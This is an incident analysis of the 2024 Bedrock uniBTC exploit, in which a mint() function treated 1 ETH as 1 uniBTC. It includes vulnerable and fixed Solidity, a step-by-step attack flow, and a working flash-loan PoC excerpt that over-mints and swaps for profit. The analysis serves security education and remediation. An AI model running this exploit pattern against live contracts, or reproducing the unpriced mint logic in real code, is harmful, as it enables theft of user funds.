# RockX UniBTC — Misconfiguration Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-26 |
| **Protocol** | Bedrock (RockX) — uniBTC |
| **Chain** | Ethereum (Chain ID: 1) |
| **Loss** | ~$1,700,000 (649.6 WETH) |
| **Attacker** | [0x2bFB...F96](https://etherscan.io/address/0x2bFB373017349820dda2Da8230E6b66739BE9F96) |
| **Attack Contract** | [0x1E1d...87D](https://etherscan.io/address/0x1E1d02D663228e5D47f1De64030B39632A3B787D) |
| **Attack Tx** | [0x725f...940](https://etherscan.io/tx/0x725f0d65340c859e0f64e72ca8260220c526c3e0ccde530004160809f6177940) |
| **Vulnerable Contract (Proxy)** | [0x047D...6Da](https://etherscan.io/address/0x047D41F2544B7F63A8e991aF2068a363d210d6Da) |
| **Vulnerable Contract (Implementation)** | [0x7026...901](https://etherscan.io/address/0x702696b2aa47fd1d4feaaf03ce273009dc47d901) |
| **Root Cause** | Misconfiguration — ETH/uniBTC exchange rate not set |
| **PoC Source** | [DeFiHackLabs — Bedrock_DeFi_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Bedrock_DeFi_exp.sol) |

---

## 1. Vulnerability Overview

Bedrock is a multi-asset liquid restaking protocol operated by RockX, where users deposit ETH (or native BTC) to receive `uniBTC`. `uniBTC` is a Bitcoin-pegged token that uses **8 decimals**, while ETH uses **18 decimals**.

The core of the vulnerability is that the `Vault` contract's `mint()` function, when receiving ETH to mint uniBTC, calculated the amount using simple arithmetic **without reflecting the actual price ratio between ETH and uniBTC at all**.

Specifically, the internal logic used the following formula:

```
uniBTC minted = ETH deposited / EXCHANGE_RATE_BASE
             = ETH deposited / 1e10
```

This calculation only compensates for the decimal difference (10 digits) between ETH (18 decimals) and uniBTC (8 decimals), effectively treating **1 ETH = 1 uniBTC**. However, at the time of the attack the market rate was approximately 1 BTC ≈ 23 ETH, meaning an attacker could deposit ETH and receive uniBTC worth roughly 23× that value.

The attacker borrowed 30.8 WETH via a Balancer flash loan, called the `mint()` function to mint 30.8 uniBTC, then swapped `uniBTC → WBTC → WETH` through Uniswap V3 to obtain 680.4 WETH, repaid the 30.8 WETH flash loan, and kept **649.6 WETH (~$1.7M)** as profit.

---

## 2. Vulnerable Code Analysis

### 2.1 mint() — No Exchange Rate Validation (Core Vulnerability)

**Vulnerable code (estimated — implementation 0x7026...901, L2417-2420)**:

```solidity
// ❌ Vulnerable: ETH → uniBTC exchange does not reflect actual price ratio
// EXCHANGE_RATE_BASE = 1e10 (only compensates for decimal difference, ignores price difference)
uint256 constant EXCHANGE_RATE_BASE = 1e10;

function mint() external payable {
    uint256 uniBTCAmt = msg.value / EXCHANGE_RATE_BASE;
    // ❌ 1 ETH → 1 uniBTC is minted
    // In reality, ETH price ≠ BTC price, so this over-mints
    _mint(msg.sender, uniBTCAmt);
}
```

**Fixed code**:

```solidity
// ✅ Fixed: Reflect ETH/BTC price ratio via an external oracle such as Chainlink
// Or exclude native ETH from mintable assets

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

AggregatorV3Interface public ethBtcPriceFeed;
uint256 constant EXCHANGE_RATE_BASE = 1e10;

function mint() external payable {
    // ✅ Fetch latest ETH/BTC price
    (, int256 ethBtcPrice,,,) = ethBtcPriceFeed.latestRoundData();
    require(ethBtcPrice > 0, "Invalid oracle price");

    // ✅ Apply actual price ratio: uniBTCAmt = ETH deposited × (ETH price / BTC price) / EXCHANGE_RATE_BASE
    uint256 uniBTCAmt = (msg.value * uint256(ethBtcPrice)) / (EXCHANGE_RATE_BASE * 1e8);
    require(uniBTCAmt > 0, "Mint amount is 0");

    _mint(msg.sender, uniBTCAmt);
}
```

**Issue**: `EXCHANGE_RATE_BASE` was set to `1e10`, **only compensating for the decimal difference** between ETH (18 decimals) and uniBTC (8 decimals) while **entirely ignoring the actual market price ratio** between ETH and BTC. As a result, the `mint()` function allowed anyone to deposit ETH and receive an equal quantity of uniBTC (denominated in BTC), which is a misconfiguration permitting approximately 23× over-minting.

### 2.2 Native ETH Deposit Allowed — Missing Whitelist

**Vulnerable code (estimated)**:

```solidity
// ❌ Vulnerable: Native ETH mint allowed without separate validation
// Whitelisted token list only contains WETH; ETH (address(0)) handling is incorrect
function mint() external payable {
    // Direct mint with ETH is possible → combines with EXCHANGE_RATE_BASE error
    uint256 uniBTCAmt = msg.value / EXCHANGE_RATE_BASE;
    _mint(msg.sender, uniBTCAmt);
}

// ERC-20 token mint has whitelist validation in a separate function
function mint(address _token, uint256 _amount) external {
    require(whitelistedTokens[_token], "Unsupported token"); // ← This check is absent for ETH
    ...
}
```

**Fixed code**:

```solidity
// ✅ Fixed: Disable native ETH mint entirely, or manage it via a separate control
function mint() external payable {
    revert("Direct ETH mint disabled: please use WBTC or another supported token");
}
```

**Issue**: The per-token mint function (`mint(address, uint256)`) had whitelist validation, but the native-ETH-receiving `mint()` payable overload did not have this validation applied. Combined with the price ratio error, this became the primary entry point for the attack.

---

## 3. Attack Flow

### 3.1 Preparation

- Attacker EOA: `0x2bFB...F96` (funded via Tornado Cash)
- The attack Tx was executed immediately upon deploying the attack contract `0x1E1d...87D` (nonce: 0, `to: null`)
- Attack block: **#20,836,584** (2024-09-26)
- No prior approval needed — `approve(router, max)` for uniBTC and WBTC was executed inside the contract

### 3.2 Execution

```
┌──────────────────────────────────────────────────────────────┐
│  Attacker EOA (0x2bFB...F96)                                 │
│  └─ Deploy attack contract + call attack()                   │
└──────────────────────────────┬───────────────────────────────┘
                               │ attack()
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  [Step 1] Balancer Vault Flash Loan                          │
│  Balancer (0xBA12...C8) → Attacker Contract                  │
│  Borrow 30.8 WETH                                            │
└──────────────────────────────┬───────────────────────────────┘
                               │ receiveFlashLoan() callback
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  [Step 2] Convert WETH → ETH                                 │
│  WETH.withdraw(30.8 WETH) → Obtain 30.8 ETH                  │
└──────────────────────────────┬───────────────────────────────┘
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  [Step 3] Call vulnerable mint() ← Core vulnerability exploit│
│  VulVault.mint{value: 30.8 ETH}()                            │
│  Calculation: 30.8e18 / 1e10 = 3,080,000,000 = 30.8 uniBTC  │
│  ❌ Actual value deposited: 30.8 ETH ≈ $80,000              │
│  ❌ Value of uniBTC minted: 30.8 BTC ≈ $1,860,000           │
│  → uniBTC over-minted (~23× excess)                          │
└──────────────────────────────┬───────────────────────────────┘
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  [Step 4] Uniswap V3 Swap 1: uniBTC → WBTC                  │
│  30.8 uniBTC → 27.84 WBTC (0.05% fee, ~1:1 ratio)           │
│  (Uniswap Pool: 0x3a32...DA)                                 │
└──────────────────────────────┬───────────────────────────────┘
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  [Step 5] Uniswap V3 Swap 2: WBTC → WETH                    │
│  27.84 WBTC → 680.4 WETH                                     │
│  (Uniswap Pool: 0x4585...0c0)                                │
└──────────────────────────────┬───────────────────────────────┘
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  [Step 6] Repay flash loan and collect profit                │
│  30.8 WETH → Repaid to Balancer Vault                        │
│  649.6 WETH → Transferred to attacker EOA                    │
│  ✅ Net profit: 649.6 WETH ≈ $1,700,000                      │
└──────────────────────────────────────────────────────────────┘
```

### 3.3 Result

| Item | Amount |
|------|------|
| Flash loan borrowed | 30.8 WETH |
| uniBTC minted | 30.8 uniBTC (3,080,000,000 satoshi) |
| WBTC received from swap | 27.84 WBTC |
| WETH received from swap | 680.4 WETH |
| Flash loan repaid | 30.8 WETH |
| **Final net profit** | **649.6 WETH ≈ $1,700,000** |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// [Core attack logic excerpt — Bedrock_DeFi_exp.sol]
// PoC author: rotcivegaf (@rotcivegaf)

contract Attacker {
    function attack() external {
        txSender = msg.sender;

        // [Pre-setup] Approve max allowance to DEX router
        IFS(uniBTC).approve(uniV3Router, type(uint256).max);
        IFS(WBTC).approve(uniV3Router, type(uint256).max);

        // [Step 1] Borrow 30.8 WETH via Balancer flash loan
        address[] memory tokens = new address[](1);
        tokens[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30_800_000_000_000_000_000; // 30.8 WETH
        IFS(balancerVault).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(...) external {
        // [Step 2] Convert WETH → ETH
        IFS(weth).withdraw(amounts[0]);

        // [Step 3] Call vulnerable mint() — over-mint uniBTC with ETH
        // Deposit 30.8 ETH → Mint 30.8 uniBTC (actual value ~23× over)
        IFS(VulVault).mint{value: address(this).balance}();
        uint256 bal_uniBTC = IFS(uniBTC).balanceOf(address(this));

        // [Step 4] Uniswap V3: Swap uniBTC → WBTC (0.05% fee)
        IFS.ExactInputSingleParams memory input = IFS.ExactInputSingleParams(
            uniBTC, WBTC, 500, address(this), block.timestamp, bal_uniBTC, 0, 0
        );
        IFS(uniV3Router).exactInputSingle(input);

        // [Step 5] Uniswap V3: Swap WBTC → WETH (0.05% fee)
        uint256 balWBTC = IFS(WBTC).balanceOf(address(this));
        input = IFS.ExactInputSingleParams(
            WBTC, weth, 500, address(this), block.timestamp, balWBTC, 0, 0
        );
        IFS(uniV3Router).exactInputSingle(input);

        // [Step 6] Repay flash loan and transfer profit to attacker
        IFS(weth).transfer(balancerVault, amounts[0]); // Repay 30.8 WETH
        uint256 bal_weth = IFS(weth).balanceOf(address(this));
        IFS(weth).transfer(txSender, bal_weth); // Collect 649.6 WETH profit
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | ETH/uniBTC exchange rate not set (decimal-only correction, no price reflection) | CRITICAL | CWE-682 |
| V-02 | Native ETH mint missing whitelist enforcement | HIGH | CWE-285 |
| V-03 | No slippage / minimum output validation before minting | MEDIUM | CWE-20 |

### V-01: ETH/uniBTC Exchange Rate Not Set

- **Description**: `EXCHANGE_RATE_BASE = 1e10` only compensates for the decimal difference (10 digits) between ETH (18 decimals) and uniBTC (8 decimals). However, since ETH and BTC have different prices (at the time of the attack, 1 BTC ≈ 23 ETH), an oracle price reflecting the actual exchange ratio must be applied. The root cause is that this correction factor was omitted at deployment.
- **Impact**: The attacker deposited 30.8 ETH (~$80K) and received 30.8 uniBTC (~$1.86M). By selling this in the Uniswap liquidity pool, they realized a profit of 649.6 WETH.
- **Attack conditions**: A `mint()` payable function exists in the Vault contract; uniBTC/WBTC liquidity exists on Uniswap; flash loan capital is accessible.

### V-02: Native ETH Mint Missing Whitelist Enforcement

- **Description**: The `mint(address, uint256)` function for ERC-20 tokens had whitelist validation, but the `mint()` payable function accepting native ETH directly did not have this validation applied.
- **Impact**: The whitelist control could be bypassed to mint directly with ETH. Combined with V-01, this amplified the damage.
- **Attack conditions**: The `mint()` payable function is active.

### V-03: No Slippage / Minimum Output Validation Before Minting

- **Description**: The `mint()` function mints an arbitrary amount without input validation such as `amountOutMinimum`. DEX swaps were also executed with `amountOutMinimum: 0`, providing zero slippage protection.
- **Impact**: There was no on-chain defensive line to detect and block the attack.
- **Attack conditions**: Sufficient liquidity exists in the liquidity pool.

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Disable native ETH mint**

```solidity
// ✅ Immediately disable direct ETH mint function
function mint() external payable {
    revert("Minting via direct ETH deposit is disabled");
}
```

**2) Integrate a price oracle (using Chainlink)**

```solidity
// ✅ Calculate actual exchange ratio using Chainlink ETH/USD and BTC/USD feeds
AggregatorV3Interface public constant ETH_USD_FEED =
    AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);
AggregatorV3Interface public constant BTC_USD_FEED =
    AggregatorV3Interface(0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c);

function _getEthToBtcRatio() internal view returns (uint256) {
    (, int256 ethUsd,,,) = ETH_USD_FEED.latestRoundData();
    (, int256 btcUsd,,,) = BTC_USD_FEED.latestRoundData();
    require(ethUsd > 0 && btcUsd > 0, "Oracle price error");
    // Return ETH/BTC ratio (8 decimals basis)
    return (uint256(ethUsd) * 1e8) / uint256(btcUsd);
}

function mint() external payable {
    uint256 ethToBtcRatio = _getEthToBtcRatio(); // e.g. 0.045 BTC/ETH → 4_500_000
    uint256 uniBTCAmt = (msg.value * ethToBtcRatio) / (1e10 * 1e8);
    require(uniBTCAmt > 0, "Mint amount is 0");
    _mint(msg.sender, uniBTCAmt);
}
```

**3) Pause minting and conduct an audit**

```solidity
// ✅ Add emergency pause functionality (OpenZeppelin Pausable)
import "@openzeppelin/contracts/security/Pausable.sol";

function mint() external payable whenNotPaused {
    ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Exchange rate error | Integrate Chainlink Proof of Reserve + price feeds; use TWAP oracle as a supplement |
| V-02: ETH mint whitelist | Unify the whitelist for supported deposit assets; allow only WBTC/WETH instead of direct ETH deposits |
| V-03: No slippage | Add a `minAmountOut` parameter to mint; set batch limits |
| General | Mandatory professional security audit before launch; introduce a separate review process for configuration value (constant) changes |

---

## 7. Lessons Learned

1. **Decimal correction ≠ price reflection**: In token exchange logic, compensating for decimal differences and reflecting market prices are **separate concerns**. If `EXCHANGE_RATE_BASE` is a constant that only aligns decimals, a separate oracle for the price ratio is absolutely required.

2. **Misconfiguration is as fatal as a code bug**: This incident was caused by **an error in a deployment configuration value**, not by the code logic itself. Constants and initialization parameters must be included in the scope of security audits.

3. **Apply consistent validation across multiple function overloads**: When multiple functions with similar behavior exist — such as `mint()` and `mint(address, uint256)` — it must be explicitly verified that the same security checks are applied to each one.

4. **Flash loans are amplifiers, not root causes**: In this attack, the flash loan was used as a **tool to maximize profit**, not to discover the vulnerability. Without the root vulnerability (exchange rate error), the flash loan alone would not have enabled the attack.

5. **Oracle integration is mandatory before DeFi launch**: Protocols that handle price-linked assets (ETH, BTC, etc.) must complete oracle integration testing before launch and use reliable price feeds such as Chainlink Proof of Reserve.

---

## 8. On-Chain Verification

> Attack transaction: [0x725f...940](https://etherscan.io/tx/0x725f0d65340c859e0f64e72ca8260220c526c3e0ccde530004160809f6177940)
> Attack block: **#20,836,584** | RPC: eth-mainnet.public.blastapi.io

### 8.1 PoC vs On-Chain Amount Comparison

| Item | PoC Expected | On-Chain Actual | Match |
|------|-----------|-------------|------|
| Flash loan borrowed | 30.8 WETH | 30,800,000,000,000,000,000 wei (30.8 WETH) | ✅ |
| uniBTC minted | 30.8 uniBTC | 3,080,000,000 satoshi (30.8 uniBTC) | ✅ |
| uniBTC → WBTC swap | ~27.8 WBTC | 2,783,925,883 satoshi (27.84 WBTC) | ✅ |
| WBTC → WETH swap | ~680 WETH | 680,404,054,576,756,594,919 wei (680.4 WETH) | ✅ |
| Flash loan repaid | 30.8 WETH | 30,800,000,000,000,000,000 wei (30.8 WETH) | ✅ |
| **Final net profit** | **649.6 WETH** | **649,604,054,576,756,594,919 wei (649.6 WETH)** | ✅ |

### 8.2 On-Chain Event Log Sequence

22 total logs, 9 Transfer events — perfectly matching the attack flow:

```
1. WETH Transfer: Balancer → Attack contract (30.8 WETH flash loan)
2. uniBTC Transfer: 0x000...000 → Attack contract (mint, 30.8 uniBTC)
3. WBTC Transfer: Uniswap Pool → Attack contract (27.84 WBTC)
4. uniBTC Transfer: Attack contract → Uniswap Pool (28.81 uniBTC, including fee)
5. WETH Transfer: Uniswap Pool → Attack contract (680.4 WETH)
6. WBTC Transfer: Attack contract → Uniswap Pool (27.84 WBTC)
7. WETH Transfer: Attack contract → Balancer (30.8 WETH repaid)
8. WETH Transfer: Attacker → aWETH Pool (649.6 WETH, deposited to Aave)
9. aETHWETH Transfer: 0x000...000 → Attacker profit address (649.6 aWETH minted)
```

**Note**: The attacker deposited the profit (649.6 WETH) into Aave (converting it to aWETH) to hold the proceeds.

### 8.3 Precondition Verification

- **`EXCHANGE_RATE_BASE` on-chain confirmation**: `cast call 0x702696... "EXCHANGE_RATE_BASE()(uint256)"` → `10000000000` (= 1e10) ✅
- **uniBTC balance in VulVault before attack**: 0 wei (no uniBTC balance in Vault immediately before the attack; created via mint after the attack)
- **Attacker from address**: `0x2bFB373017349820dda2Da8230E6b66739BE9F96` ✅
- **Attack contract to address**: `null` (contract deployment Tx, `nonce: 0`) → attack executed immediately upon deployment

---

Sources:
- [UniBtc Hack Analysis - BlockApex](https://blockapex.io/unibtc-hack-analysis/)
- [Bedrock uniBTC Hack Analysis - lunaray](https://lunaray.medium.com/bedrock-unibtc-hack-analysis-7808902e5a7c)
- [Decoding What Went Wrong with Bedrock: $2M Exploit - QuillAudits](https://www.quillaudits.com/blog/hack-analysis/bedrock-2million-exploit)
- [Liquid Restaking Protocol Bedrock Loses $2 Million - CryptoNews](https://cryptonews.com/news/liquid-restaking-protocol-bedrock-loses-2-million-in-unibtc-security-exploit/)
- [DeFiHackLabs PoC - Bedrock_DeFi_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Bedrock_DeFi_exp.sol)
- [Attack Transaction - Etherscan](https://etherscan.io/tx/0x725f0d65340c859e0f64e72ca8260220c526c3e0ccde530004160809f6177940)